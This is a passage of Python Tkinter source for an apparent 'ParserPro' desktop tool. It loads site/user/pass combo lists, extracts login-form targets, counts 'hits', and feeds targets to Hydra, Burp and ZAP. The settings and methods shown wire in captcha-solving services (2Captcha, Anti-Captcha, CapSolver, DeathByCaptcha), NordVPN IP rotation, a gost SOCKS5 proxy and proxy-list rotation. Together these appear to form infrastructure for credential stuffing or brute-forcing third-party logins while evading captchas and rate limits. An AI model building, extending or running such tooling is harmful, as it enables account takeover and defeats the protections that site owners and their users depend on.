        ttk.Label(network_frame, text="WSL Username (optional, for Hydra over WSL)").pack(anchor="w", padx=10, pady=(0, 2))
        self.wsl_username = tk.StringVar(value=config.get("wsl_username", ""))
        ttk.Entry(network_frame, textvariable=self.wsl_username).pack(fill="x", padx=10, pady=(0, 8))

        ttk.Label(network_frame, text="WSL Password (optional, used for sudo install)").pack(anchor="w", padx=10, pady=(0, 2))
        self.wsl_password = tk.StringVar(value=config.get("wsl_password", ""))
        ttk.Entry(network_frame, textvariable=self.wsl_password, show="*").pack(fill="x", padx=10, pady=(0, 8))

        self.proxy_required = tk.BooleanVar(value=bool(config.get("proxy_required", False)))
        ttk.Checkbutton(network_frame, text="Require proxy (fail fast if unreachable)", variable=self.proxy_required).pack(anchor="w", padx=10, pady=3)

        self.allow_nonstandard_ports = tk.BooleanVar(value=bool(config.get("allow_nonstandard_ports", False)))
        ttk.Checkbutton(network_frame, text="Allow nonstandard ports during extraction", variable=self.allow_nonstandard_ports).pack(anchor="w", padx=10, pady=3)

        ttk.Label(network_frame, text="Cache TTL days (success/no form)").pack(anchor="w", padx=10, pady=(6, 2))
        self.cache_ttl_days = tk.IntVar(value=int(config.get("cache_ttl_days", 30)))
        ttk.Entry(network_frame, textvariable=self.cache_ttl_days).pack(fill="x", padx=10, pady=(0, 8))

        ttk.Label(network_frame, text="Retry TTL days (fetch failures)").pack(anchor="w", padx=10, pady=(0, 2))
        self.failed_retry_ttl_days = tk.IntVar(value=int(config.get("failed_retry_ttl_days", 1)))
        ttk.Entry(network_frame, textvariable=self.failed_retry_ttl_days).pack(fill="x", padx=10, pady=(0, 10))

        behavior_frame = ttk.LabelFrame(content, text="Behavior & Autosave")
        behavior_frame.pack(fill="x", padx=6, pady=8)

        self.debug_logging = tk.BooleanVar(value=bool(config.get("debug_logging", False)))
        ttk.Checkbutton(behavior_frame, text="Enable debug logging", variable=self.debug_logging).pack(anchor="w", padx=10, pady=(8, 3))

        self.autosave_enabled_setting = tk.BooleanVar(value=self.autosave_enabled.get())
        ttk.Checkbutton(behavior_frame, text="Enable autosave for project files", variable=self.autosave_enabled_setting).pack(anchor="w", padx=10, pady=3)
        ttk.Label(behavior_frame, text="Autosave interval (minutes)").pack(anchor="w", padx=10, pady=(6, 2))
        self.autosave_interval_setting = tk.IntVar(value=self.autosave_interval_minutes.get())
        ttk.Entry(behavior_frame, textvariable=self.autosave_interval_setting).pack(fill="x", padx=10, pady=(0, 10))

        proxy_rotation_frame = ttk.LabelFrame(content, text="Proxy Routing")
        proxy_rotation_frame.pack(fill="x", padx=6, pady=8)

        ttk.Label(proxy_rotation_frame, text="Burp Proxy (optional, e.g. http://127.0.0.1:8080)").pack(anchor="w", padx=10, pady=(8, 2))
        self.burp_proxy = tk.StringVar(value=config.get("burp_proxy", ""))
        ttk.Entry(proxy_rotation_frame, textvariable=self.burp_proxy).pack(fill="x", padx=10, pady=(0, 8))
        ttk.Checkbutton(proxy_rotation_frame, text="Enable Burp Proxy", variable=self.use_burp).pack(anchor="w", padx=10, pady=3)

        ttk.Label(proxy_rotation_frame, text="ZAP Proxy (optional, e.g. http://127.0.0.1:8080)").pack(anchor="w", padx=10, pady=(8, 2))
        self.zap_proxy = tk.StringVar(value=config.get("zap_proxy", "http://127.0.0.1:8080"))
        ttk.Entry(proxy_rotation_frame, textvariable=self.zap_proxy).pack(fill="x", padx=10, pady=(0, 6))
        ttk.Checkbutton(proxy_rotation_frame, text="Enable ZAP Proxy", variable=self.use_zap).pack(anchor="w", padx=10, pady=3)
        ttk.Label(proxy_rotation_frame, text="ZAP API Key (optional)").pack(anchor="w", padx=10, pady=(6, 2))
        ttk.Entry(proxy_rotation_frame, textvariable=self.zap_api_key).pack(fill="x", padx=10, pady=(0, 6))
        ttk.Checkbutton(proxy_rotation_frame, text="Auto-start ZAP daemon", variable=self.auto_start_zap_daemon).pack(anchor="w", padx=10, pady=3)

        ttk.Checkbutton(proxy_rotation_frame, text="Enable proxy rotation", variable=self.proxy_rotation).pack(anchor="w", padx=10, pady=3)
        ttk.Label(proxy_rotation_frame, text="Proxy list file (one proxy per line)").pack(anchor="w", padx=10, pady=(6, 2))
        proxy_file_row = ttk.Frame(proxy_rotation_frame)
        proxy_file_row.pack(fill="x", padx=10, pady=(0, 10))
        ttk.Entry(proxy_file_row, textvariable=self.proxy_list_file).pack(side="left", fill="x", expand=True)
        ttk.Button(proxy_file_row, text="Browse", command=self.choose_proxy_list_file).pack(side="left", padx=(8, 0))

        action_row = ttk.Frame(content)
        action_row.pack(fill="x", padx=6, pady=(12, 8))
        ttk.Button(action_row, text="Save & Close", command=self.save_settings).pack(side="right")

    def build_burp_tab(self, tab):
        frame = ttk.Frame(tab, padding=12)
        frame.pack(fill="both", expand=True)
        ttk.Label(frame, text="Burp Suite Community Integration", style="Header.TLabel").pack(anchor="w", pady=(0, 8))
        ttk.Label(frame, text="Use this tab to launch Burp and export extracted form/command data.").pack(anchor="w", pady=(0, 10))
        ttk.Button(frame, text="Launch Burp Suite", command=self.on_launch_burp).pack(anchor="w", pady=4)
        ttk.Button(frame, text="Send current data to Burp", command=self.on_send_current_data_to_burp).pack(anchor="w", pady=4)

    def build_zap_tab(self, tab):
        frame = ttk.Frame(tab, padding=12)
        frame.pack(fill="both", expand=True)
        ttk.Label(frame, text="OWASP ZAP Integration", style="Header.TLabel").pack(anchor="w", pady=(0, 8))
        ttk.Label(frame, text="Launch ZAP and queue extracted URLs for active scan via API.").pack(anchor="w", pady=(0, 10))
        ttk.Button(frame, text="Launch OWASP ZAP", command=self.on_launch_zap).pack(anchor="w", pady=4)
        ttk.Button(frame, text="Import current data to ZAP", command=self.on_import_current_data_to_zap).pack(anchor="w", pady=4)

    def on_launch_burp(self):
        ok, msg = launch_burp()
        (messagebox.showinfo if ok else messagebox.showwarning)("Burp", msg)
        if not ok:
            self._write_log_threadsafe(f"Burp launch fallback. Download: {BURP_DOWNLOAD_URL}")

    def _current_extracted_targets(self):
        targets = []
        for site, item in (self.processed_data or {}).items():
            extracted = (item or {}).get("extracted") or {}
            if extracted:
                targets.append({
                    "site": site,
                    "action_url": extracted.get("action_url") or extracted.get("action") or extracted.get("original_url"),
                    "method": extracted.get("method", "post"),
                    "post_data": extracted.get("post_data", ""),
                })
        return targets

    def on_send_current_data_to_burp(self):
        targets = self._current_extracted_targets()
        if not targets:
            messagebox.showinfo("Burp", "No extracted data available yet.")
            return
        out = DATA_DIR / "burp_import.json"
        out.write_text(json.dumps({"targets": targets}, indent=2), encoding="utf-8")
        messagebox.showinfo("Burp", f"Exported {len(targets)} targets to {out}")

    def on_launch_zap(self):
        ok, msg = launch_zap(
            daemon=bool(config.get("auto_start_zap_daemon", False)),
            proxy_url=config.get("zap_proxy", "http://127.0.0.1:8080"),
            api_key=config.get("zap_api_key", ""),
        )
        (messagebox.showinfo if ok else messagebox.showwarning)("ZAP", msg)

    def on_import_current_data_to_zap(self):
        targets = self._current_extracted_targets()
        if not targets:
            messagebox.showinfo("ZAP", "No extracted data available yet.")
            return
        try:
            ok, msg = import_data_to_zap(
                proxy_url=config.get("zap_proxy", "http://127.0.0.1:8080"),
                api_key=config.get("zap_api_key", ""),
                targets=targets,
            )
            (messagebox.showinfo if ok else messagebox.showwarning)("ZAP", msg)
        except Exception as exc:
            messagebox.showerror("ZAP", f"Failed to import into ZAP: {exc}")

    def choose_proxy_list_file(self):
        fp = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All", "*.*")])
        if fp:
            self.proxy_list_file.set(fp)

    def save_settings(self):
        config['dbc_user'] = self.dbc_user.get()
        config['dbc_pass'] = self.dbc_pass.get()
        config['nord_token'] = self.nord_token.get()
        config['twocaptcha_key'] = self.twocaptcha_key.get()
        config['anticaptcha_key'] = self.anticaptcha_key.get()
        config['capsolver_key'] = self.capsolver_key.get()
        config['vpn_control'] = self.vpn_control.get().strip().lower()
        config['proxy_url'] = self.proxy_url_setting.get().strip()
        config['wsl_username'] = self.wsl_username.get().strip()
        config['wsl_password'] = self.wsl_password.get()
        config['proxy_required'] = bool(self.proxy_required.get())
        config['allow_nonstandard_ports'] = bool(self.allow_nonstandard_ports.get())
        config['cache_ttl_days'] = max(1, int(self.cache_ttl_days.get() or 30))
        config['failed_retry_ttl_days'] = max(1, int(self.failed_retry_ttl_days.get() or 1))
        config['force_recheck'] = bool(self.force_recheck.get())
        config['burp_proxy'] = self.burp_proxy.get().strip()
        config['use_burp'] = bool(self.use_burp.get())
        config['zap_proxy'] = self.zap_proxy.get().strip()
        config['use_zap'] = bool(self.use_zap.get())
        config['zap_api_key'] = self.zap_api_key.get().strip()
        config['auto_start_zap_daemon'] = bool(self.auto_start_zap_daemon.get())
        config['proxy_rotation'] = bool(self.proxy_rotation.get())
        config['proxy_list_file'] = self.proxy_list_file.get().strip()
        config['ignore_https_errors'] = bool(config.get('ignore_https_errors', False))
        config['debug_logging'] = bool(self.debug_logging.get())
        self.autosave_enabled.set(bool(self.autosave_enabled_setting.get()))
        self.autosave_interval_minutes.set(max(1, int(self.autosave_interval_setting.get() or 2)))
        config['autosave_enabled'] = bool(self.autosave_enabled.get())
        config['autosave_interval_minutes'] = int(self.autosave_interval_minutes.get())
        logger.set_debug(bool(config.get('debug_logging', False)))
        save_config()
        messagebox.showinfo("Settings", "Settings saved.")
        if self.settings_window and self.settings_window.winfo_exists():
            self.settings_window.destroy()

    def _resolve_nordvpn_cli(self):
        status = ensure_nordvpn_cli(log_func=self._write_log_threadsafe)
        return status.get("path") if status.get("available") else None

    def _windows_nordvpn_supported(self, cli_path):
        if platform.system().lower() != "windows":
            return True
        if "nordvpngui" in Path(cli_path).name.lower():
            return False
        try:
            result = subprocess.run([cli_path, "--help"], capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=5)
            help_text = (result.stdout or "") + "\n" + (result.stderr or "")
            help_text = help_text.lower()
        except Exception:
            return False
        return "connect" in help_text and "disconnect" in help_text

    def setup_nordvpn_proxy(self):
        if get_vpn_control(config) != "nordvpn":
            return None
        try:
            cli_path = self._resolve_nordvpn_cli()
            if not cli_path or not self._windows_nordvpn_supported(cli_path):
                msg = "NordVPN CLI not available; install NordVPN Windows app/CLI and retry."
                self._write_log_threadsafe(msg)
                self.ui_queue.put(("critical_error", msg))
                return None

            if not config.get('nord_token'):
                self._write_log_threadsafe("No NordVPN token set - using no proxy")
                return None

            self._write_log_threadsafe("Setting up NordVPN + SOCKS5 proxy...")
            login_proc = subprocess.run([cli_path, "login", "--token", config['nord_token']], capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=30)
            if login_proc.returncode != 0:
                raise RuntimeError((login_proc.stderr or login_proc.stdout or "NordVPN login failed").strip())
            connect_proc = subprocess.run([cli_path, "connect"], capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=30)
            if connect_proc.returncode != 0:
                raise RuntimeError((connect_proc.stderr or connect_proc.stdout or "NordVPN connect failed").strip())

            gost_path = download_gost()
            if not gost_path:
                self._write_log_threadsafe("gost unavailable; continuing without proxy")
                return None

            self.gost_process = subprocess.Popen([str(gost_path), "-L=socks5://:1080"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)
            return {"server": "socks5://127.0.0.1:1080"}
        except Exception as e:
            self._write_log_threadsafe(f"NordVPN / gost setup failed: {e}. Falling back to no proxy.")
            return None

    def rotate_nordvpn(self):
        if get_vpn_control(config) != "nordvpn":
            return
        try:
            cli_path = self._resolve_nordvpn_cli()
            if not cli_path or not self._windows_nordvpn_supported(cli_path):
                return
            subprocess.run([cli_path, "disconnect"], capture_output=True)
            subprocess.run([cli_path, "connect"], capture_output=True)
            self._write_log_threadsafe("Rotated NordVPN IP")
        except Exception as e:
            self._write_log_threadsafe(f"IP rotation failed: {e}")

    def choose_input_file(self):
        fp = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All", "*.*")])
        if fp:
            self.input_path.set(fp)
            if not self.output_path.get():
                self.output_path.set(str(Path(fp).with_suffix(".csv")))
            self._write_log_threadsafe(f"Input file: {fp}")

    def choose_input_folder(self):
        d = filedialog.askdirectory()
        if d:
            self.input_path.set(d)
            if not self.output_path.get():
                self.output_path.set(str(Path(d) / "combined.csv"))
            self._write_log_threadsafe(f"Input folder: {d}")

    def choose_output_file(self):
        fp = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV", "*.csv")])
        if fp:
            self.output_path.set(fp)
            self._write_log_threadsafe(f"Output CSV: {fp}")

    def choose_forms_output_file(self):
        fp = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV", "*.csv")])
        if fp:
            self.forms_output_path.set(fp)
            self._write_log_threadsafe(f"Forms CSV: {fp}")

    def clear_log(self):
        self.log.delete("1.0", tk.END)

    def _current_filter_state(self):
        return {
            "min_combos": self.min_combos_var.get() if hasattr(self, "min_combos_var") else "0",
            "status": self.status_filter_var.get() if hasattr(self, "status_filter_var") else "All",
            "min_hits": self.min_hits_var.get() if hasattr(self, "min_hits_var") else "0",
            "last_run": self.last_run_filter_var.get() if hasattr(self, "last_run_filter_var") else "All",
        }

    def _project_payload(self):
        selected = [row.get("site") for row in self.runner_rows_all if row.get("selected")]
        sort_state = {"column": self.runner_last_sort_col, "reverse": self.runner_sort_state.get(self.runner_last_sort_col, False) if self.runner_last_sort_col else False}
        ui_state = {
            "input_path": self.input_path.get(),
            "output_path": self.output_path.get(),
            "forms_output_path": self.forms_output_path.get(),
            "headers": [self.header1.get(), self.header2.get(), self.header3.get()],
        }
        app_settings = {
            "ignore_https_errors": bool(config.get("ignore_https_errors", False)),
            "allow_nonstandard_ports": bool(config.get("allow_nonstandard_ports", False)),
            "proxy_url": config.get("proxy_url", ""),
            "burp_proxy": config.get("burp_proxy", ""),
            "use_burp": bool(config.get("use_burp", False)),
            "zap_proxy": config.get("zap_proxy", ""),
            "use_zap": bool(config.get("use_zap", False)),
            "proxy_rotation": bool(config.get("proxy_rotation", False)),
            "proxy_list_file": config.get("proxy_list_file", ""),
            "autosave_enabled": self.autosave_enabled.get(),
            "autosave_interval_minutes": self.autosave_interval_minutes.get(),
        }
        return build_project_payload(
            project_name=self.current_project_name,
            project_path=self.current_project_path,
            created_ts=self.project_created_ts,
            sites_db=self.sites_db,
            filters=self._current_filter_state(),
            sort_state=sort_state,
            selection=selected,
            ui_state=ui_state,
            app_settings=app_settings,
            timeline_events=self.timeline_events,
            run_summaries=[s.to_dict() for s in self.run_summaries],
        )

    def _autosave_now(self):
        if not self.autosave_enabled.get() or not self.current_project_path:
            return
        try:
            atomic_write_json(self.current_project_path, self._project_payload())
            self.record_event("INFO", "project", "autosave", "Project autosaved", {"path": self.current_project_path})
            self.status_text.set(f"Autosaved project: {Path(self.current_project_path).name}")
        except Exception as exc:
            self._write_log_threadsafe(f"Autosave failed: {exc}")

    def request_autosave(self):
        if self.autosave_enabled.get() and self.current_project_path:
            self.autosave_worker.request()

    def _schedule_autosave_tick(self):
        mins = max(1, int(self.autosave_interval_minutes.get() or 2))
        self.root.after(mins * 60 * 1000, self._autosave_periodic)

    def _autosave_periodic(self):
        self.request_autosave()
        self._schedule_autosave_tick()

    def new_project(self):
        self.current_project_path = None
        self.current_project_name = "Untitled"
        self.project_created_ts = utc_now_iso()
        self.project_label_var.set("Project: Untitled")
        self.record_event("INFO", "project", "start", "New project created")

    def save_project(self, as_new=False):
        if as_new or not self.current_project_path:
            fp = filedialog.asksaveasfilename(defaultextension=".pproj", filetypes=[("ParserPro Project", "*.pproj *.parserproproj.json")])
            if not fp:
                return
            self.current_project_path = fp
            self.current_project_name = Path(fp).stem
        payload = self._project_payload()
        atomic_write_json(self.current_project_path, payload)
        self.project_label_var.set(f"Project: {self.current_project_name}")
        self.record_event("INFO", "project", "save", "Project saved", {"path": self.current_project_path})
        self.status_text.set(f"Saved project: {Path(self.current_project_path).name}")

    def open_project(self):
        fp = filedialog.askopenfilename(filetypes=[("ParserPro Project", "*.pproj *.parserproproj.json"), ("JSON", "*.json")])
        if not fp:
            return
        raw = json.loads(Path(fp).read_text(encoding="utf-8"))
        proj = load_project_payload(raw)
        self.current_project_path = fp
        self.current_project_name = proj.get("project_name") or Path(fp).stem
        self.project_created_ts = proj.get("created_ts")
        self.project_label_var.set(f"Project: {self.current_project_name}")
        ui_state = proj.get("ui_state") or {}
        self.input_path.set(ui_state.get("input_path", ""))
        self.output_path.set(ui_state.get("output_path", ""))
        self.forms_output_path.set(ui_state.get("forms_output_path", ""))
        headers = ui_state.get("headers") or ["site", "user", "pass"]
        if len(headers) >= 3:
            self.header1.set(headers[0]); self.header2.set(headers[1]); self.header3.set(headers[2])

        self.sites_db = proj.get("results") or {}
        self.processed_data = self.sites_db
        self.timeline_events = [normalize_event(ev) for ev in (proj.get("timeline_events") or [])]
        self.run_summaries = [run_summary_from_dict(item) for item in (proj.get("run_summaries") or [])]
        self.selected_run_id = self.run_summaries[-1].run_id if self.run_summaries else None
        self.save_processed_data()
        self.refresh_troubleshooting_panel()
        self.request_autosave()

        filters = proj.get("ui_filters") or {}
        if hasattr(self, "min_combos_var"):
            self.min_combos_var.set(filters.get("min_combos", "0"))
            self.status_filter_var.set(filters.get("status", "All"))
            self.min_hits_var.set(filters.get("min_hits", "0"))
            self.last_run_filter_var.set(filters.get("last_run", "All"))

        session_settings = proj.get("session_settings") or {}
        self.autosave_enabled.set(bool(session_settings.get("autosave_enabled", True)))
        self.autosave_interval_minutes.set(int(session_settings.get("autosave_interval_minutes", 2)))
        self.refresh_runner_list()
        self.refresh_troubleshooting_panel()
        self.refresh_timeline_view()
        self.refresh_run_history_view()
        self.record_event("INFO", "project", "load", "Project opened", {"path": fp})
        self.status_text.set(f"Opened project: {Path(fp).name}")

    def _rows_for_export(self, filtered=False):
        if filtered and self.runner_rows_view:
            db = {r["site"]: self.sites_db.get(r["site"], {}) for r in self.runner_rows_view}
        else:
            db = self.sites_db
        return site_report_rows(db)

    def export_report_json(self):
        filtered = messagebox.askyesno("Export Scope", "Export filtered view only?")
        fp = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON", "*.json")])
        if not fp:
            return
        rows = self._rows_for_export(filtered=filtered)
        include_timeline = messagebox.askyesno("Timeline", "Include timeline in JSON export?")
        include_runs = messagebox.askyesno("Run summaries", "Include run summaries in JSON export?")
        timeline = self._filtered_timeline_events() if include_timeline else None
        summaries = [s.to_dict() for s in self.run_summaries] if include_runs else None
        export_rows_json(
            fp,
            project_meta={"name": self.current_project_name, "path": self.current_project_path},
            rows=rows,
            summary=summarize_status_counts(rows),
            timeline_events=timeline,
            run_summaries=summaries,
        )
        self.record_event("INFO", "export", "export", "JSON export created", {"record_count": len(rows), "include_timeline": bool(include_timeline), "include_run_summaries": bool(include_runs)})
        self.status_text.set(f"Exported JSON report: {Path(fp).name}")

    def export_report_csv(self):
        filtered = messagebox.askyesno("Export Scope", "Export filtered view only?")
        fp = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV", "*.csv")])
        if not fp:
            return
        rows = self._rows_for_export(filtered=filtered)
        export_rows_csv(fp, rows)
        self.record_event("INFO", "export", "export", "CSV export created", {"record_count": len(rows)})
        self.status_text.set(f"Exported CSV report: {Path(fp).name}")

    def export_run_summaries_csv(self):
        fp = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV", "*.csv")])
        if not fp:
            return
        export_run_summaries_csv(fp, [s.to_dict() for s in self.run_summaries])
        self.record_event("INFO", "export", "export", "Run summary CSV exported", {"run_count": len(self.run_summaries)})
        self.status_text.set(f"Exported run summary CSV: {Path(fp).name}")

    def build_timeline_tab(self, tab):
        tab.columnconfigure(0, weight=1)
        tab.rowconfigure(4, weight=1)

        controls = ttk.Frame(tab, padding=8)
        controls.grid(row=0, column=0, sticky="ew")
        ttk.Label(controls, text="Level").pack(side="left")
        self.timeline_level_var = tk.StringVar(value="All")
        ttk.Combobox(controls, textvariable=self.timeline_level_var, values=["All", "INFO", "WARN", "ERROR"], width=8, state="readonly").pack(side="left", padx=4)
        ttk.Label(controls, text="Category").pack(side="left", padx=(8, 0))
        self.timeline_category_var = tk.StringVar(value="All")
        self.timeline_category_combo = ttk.Combobox(controls, textvariable=self.timeline_category_var, values=self._timeline_known_categories(), width=12, state="readonly")
        self.timeline_category_combo.pack(side="left", padx=4)
        ttk.Label(controls, text="Range").pack(side="left", padx=(8, 0))
        self.timeline_range_var = tk.StringVar(value="All")
        ttk.Combobox(controls, textvariable=self.timeline_range_var, values=["All", "Last 10m", "Last hour", "Today"], width=10, state="readonly").pack(side="left", padx=4)
        ttk.Label(controls, text="Search").pack(side="left", padx=(8, 0))
        self.timeline_search_var = tk.StringVar(value="")
        ttk.Entry(controls, textvariable=self.timeline_search_var, width=22).pack(side="left", padx=4)
        ttk.Button(controls, text="Apply", command=self.refresh_timeline_view).pack(side="left", padx=4)
        ttk.Button(controls, text="Clear Timeline", command=self.clear_timeline).pack(side="right", padx=4)

        summary = ttk.LabelFrame(tab, text="Latest Run Summary", padding=8)
        summary.grid(row=1, column=0, sticky="ew", padx=8, pady=(0, 6))
        summary.columnconfigure(0, weight=1)
        self.compare_to_previous_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(summary, text="Compare to previous run", variable=self.compare_to_previous_var, command=self.refresh_run_history_view).grid(row=0, column=0, sticky="w")
        ttk.Button(summary, text="Copy summary", command=self.copy_run_summary).grid(row=0, column=1, sticky="e")
        self.run_summary_text_var = tk.StringVar(value="No runs recorded yet.")
        self.run_summary_delta_var = tk.StringVar(value="")
        ttk.Label(summary, textvariable=self.run_summary_text_var, justify="left").grid(row=1, column=0, columnspan=2, sticky="w", pady=(6, 2))
        ttk.Label(summary, textvariable=self.run_summary_delta_var, justify="left", foreground="#355c7d").grid(row=2, column=0, columnspan=2, sticky="w")

        history_frame = ttk.LabelFrame(tab, text="Run History", padding=6)
        history_frame.grid(row=2, column=0, sticky="nsew", padx=8, pady=(0, 6))
        history_frame.columnconfigure(0, weight=1)
        history_frame.rowconfigure(0, weight=1)
        history_cols = ("Started", "Duration", "Processed", "Actionable", "Login-ish", "No-form", "Failed", "Top Error", "Top Domain")
        self.run_history_tree = ttk.Treeview(history_frame, columns=history_cols, show="headings", height=6)
        for col in history_cols:
            self.run_history_tree.heading(col, text=col, command=lambda c=col: self.sort_run_history_by(c))
            self.run_history_tree.column(col, width=120 if col not in {"Top Error", "Top Domain"} else 180, anchor="w")
        self.run_history_tree.grid(row=0, column=0, sticky="nsew")
        run_history_y = ttk.Scrollbar(history_frame, orient="vertical", command=self.run_history_tree.yview)
        run_history_y.grid(row=0, column=1, sticky="ns")
        run_history_x = ttk.Scrollbar(history_frame, orient="horizontal", command=self.run_history_tree.xview)
        run_history_x.grid(row=1, column=0, sticky="ew")
        self.run_history_tree.configure(yscrollcommand=run_history_y.set, xscrollcommand=run_history_x.set)
        self._bind_scroll_wheel(self.run_history_tree)
        self.run_history_tree.bind("<<TreeviewSelect>>", lambda _e: self.on_run_history_selected())

        self.timeline_canvas = tk.Canvas(tab, height=70, bg="white", highlightthickness=1, highlightbackground="#d0d0d0")
        self.timeline_canvas.grid(row=3, column=0, sticky="ew", padx=8, pady=(0, 6))

        cols = ("Time", "Level", "Category", "Action", "Message")
        self.timeline_tree = ttk.Treeview(tab, columns=cols, show="headings")
        for col in cols:
            self.timeline_tree.heading(col, text=col, command=lambda c=col: self.sort_timeline_by(c))
            self.timeline_tree.column(col, anchor="w", width=170 if col != "Message" else 520)
        timeline_tree_frame = ttk.Frame(tab)
        timeline_tree_frame.grid(row=4, column=0, sticky="nsew", padx=8, pady=(0, 8))
        timeline_tree_frame.columnconfigure(0, weight=1)
        timeline_tree_frame.rowconfigure(0, weight=1)
        self.timeline_tree.grid(row=0, column=0, sticky="nsew")
        timeline_y = ttk.Scrollbar(timeline_tree_frame, orient="vertical", command=self.timeline_tree.yview)
        timeline_y.grid(row=0, column=1, sticky="ns")
        timeline_x = ttk.Scrollbar(timeline_tree_frame, orient="horizontal", command=self.timeline_tree.xview)
        timeline_x.grid(row=1, column=0, sticky="ew")
        self.timeline_tree.configure(yscrollcommand=timeline_y.set, xscrollcommand=timeline_x.set)
        self._bind_scroll_wheel(self.timeline_tree)
        self.timeline_tree.bind("<ButtonRelease-1>", lambda _e: self.on_timeline_row_selected())
        self.refresh_timeline_view()
        self.refresh_run_history_view()

    def _find_run_summary(self, run_id):
        for idx, summary in enumerate(self.run_summaries):
            if summary.run_id == run_id:
                return idx, summary
        return None, None

    def _summary_block(self, summary, include_delta=True):
        top_error = (summary.top_error_codes or [("-", 0)])[0]
        top_domain = (summary.top_domains_failed or [("-", 0)])[0]
        lines = [
            f"Started: {summary.started_ts}",
            f"Duration: {summary.duration_s:.1f}s | Processed: {summary.sites_processed_this_run} | Skipped cached: {summary.sites_skipped_cached}",
            f"Actionable: {summary.successes_actionable} | Login-ish: {summary.successes_loginish} | No-form: {summary.no_form} | Failed: {summary.fetch_failed}",
            f"Failures: DNS {summary.dns_failed} / TLS {summary.tls_failed} / Proxy {summary.proxy_failed} / ConnClosed {summary.conn_closed} / Other {summary.other_failed}",
            f"Top error: {top_error[0]} ({top_error[1]}) | Top domain: {top_domain[0]} ({top_domain[1]})",
        ]
        if include_delta and self.compare_to_previous_var.get():
            delta = self._summary_delta_text(summary)
            if delta:
                lines.append(f"Deltas vs previous: {delta}")
        return "\n".join(lines)

    def _summary_delta_text(self, summary):
        idx, _ = self._find_run_summary(summary.run_id)
        if idx is None or idx <= 0:
            return ""
        prev = self.run_summaries[idx - 1]
        fields = ["successes_actionable", "successes_loginish", "no_form", "fetch_failed", "dns_failed", "tls_failed", "proxy_failed", "conn_closed", "other_failed"]
        out = []
        for field in fields:
            diff = getattr(summary, field, 0) - getattr(prev, field, 0)
            if diff:
                out.append(f"{field} {diff:+d}")
        return ", ".join(out)

    def refresh_run_history_view(self):
        if not hasattr(self, "run_history_tree"):
            return
        tree = self.run_history_tree
        tree.delete(*tree.get_children())
        column = self.run_history_sort_state.get("column", "Started")
        reverse = bool(self.run_history_sort_state.get("reverse", True))
        rows = list(self.run_summaries)
        key_fn = {
            "Started": lambda r: parse_ts(r.started_ts) or datetime.min,
            "Duration": lambda r: r.duration_s,
            "Processed": lambda r: r.sites_processed_this_run,
            "Actionable": lambda r: r.successes_actionable,
            "Login-ish": lambda r: r.successes_loginish,
            "No-form": lambda r: r.no_form,
            "Failed": lambda r: r.fetch_failed,
            "Top Error": lambda r: ((r.top_error_codes or [("", 0)])[0][0]).lower(),
            "Top Domain": lambda r: ((r.top_domains_failed or [("", 0)])[0][0]).lower(),
        }.get(column, lambda r: parse_ts(r.started_ts) or datetime.min)
        rows.sort(key=key_fn, reverse=reverse)

        for summary in rows:
            top_error = (summary.top_error_codes or [("-", 0)])[0]
            top_domain = (summary.top_domains_failed or [("-", 0)])[0]
            tree.insert("", "end", iid=summary.run_id, values=(summary.started_ts, f"{summary.duration_s:.1f}s", summary.sites_processed_this_run, summary.successes_actionable, summary.successes_loginish, summary.no_form, summary.fetch_failed, f"{top_error[0]} ({top_error[1]})", f"{top_domain[0]} ({top_domain[1]})"))

        if not self.selected_run_id and self.run_summaries:
            self.selected_run_id = self.run_summaries[-1].run_id
        if self.selected_run_id and tree.exists(self.selected_run_id):
            tree.selection_set(self.selected_run_id)
            tree.see(self.selected_run_id)
            _, selected = self._find_run_summary(self.selected_run_id)
        else:
            selected = self.run_summaries[-1] if self.run_summaries else None
        if selected:
            self.run_summary_text_var.set(self._summary_block(selected, include_delta=False))
            self.run_summary_delta_var.set(self._summary_delta_text(selected) if self.compare_to_previous_var.get() else "")
        else:
            self.run_summary_text_var.set("No runs recorded yet.")
            self.run_summary_delta_var.set("")

    def sort_run_history_by(self, col):
        reverse = self.run_history_sort_state.get("column") == col and not self.run_history_sort_state.get("reverse", False)
        self.run_history_sort_state = {"column": col, "reverse": reverse}
        self.refresh_run_history_view()

    def on_run_history_selected(self):
        if not hasattr(self, "run_history_tree"):
            return
        sel = self.run_history_tree.selection()
        if not sel:
            return
        self.selected_run_id = sel[0]
        _, summary = self._find_run_summary(self.selected_run_id)
        if summary:
            self.run_summary_text_var.set(self._summary_block(summary, include_delta=False))
            self.run_summary_delta_var.set(self._summary_delta_text(summary) if self.compare_to_previous_var.get() else "")

    def copy_run_summary(self):
        if not self.run_summaries:
            return
        _, summary = self._find_run_summary(self.selected_run_id)
        if summary is None:
            summary = self.run_summaries[-1]
        text = self._summary_block(summary, include_delta=True)
        self.root.clipboard_clear()
        self.root.clipboard_append(text)
    def clear_timeline(self):
        if not messagebox.askyesno("Clear Timeline", "Clear timeline events only?"):
            return
        self.timeline_events = []
        self.timeline_row_ids = {}
        self.refresh_timeline_view()
        self.record_event("INFO", "ui", "clear", "Timeline cleared")

    def _filtered_timeline_events(self):
        level = self.timeline_level_var.get() if hasattr(self, "timeline_level_var") else "All"
        category = self.timeline_category_var.get() if hasattr(self, "timeline_category_var") else "All"
        range_key = self.timeline_range_var.get() if hasattr(self, "timeline_range_var") else "All"
        query = (self.timeline_search_var.get() if hasattr(self, "timeline_search_var") else "").strip().lower()
        events = []
        for event in self.timeline_events:
            if level != "All" and event.get("level") != level:
                continue
            if category != "All" and event.get("category") != category:
                continue
            if not in_time_window(event.get("ts", ""), range_key):
                continue
            if query and query not in str(event.get("message", "")).lower():
                continue
            events.append(event)
        return events

    def refresh_timeline_view(self):
        if not hasattr(self, "timeline_tree"):
            return
        self.timeline_category_combo.configure(values=self._timeline_known_categories())
        events = self._filtered_timeline_events()
        sort_col = self.timeline_sort_state.get("column", "Time")
        reverse = bool(self.timeline_sort_state.get("reverse", True))
        key_map = {"Time": "ts", "Level": "level", "Category": "category", "Action": "action", "Message": "message"}
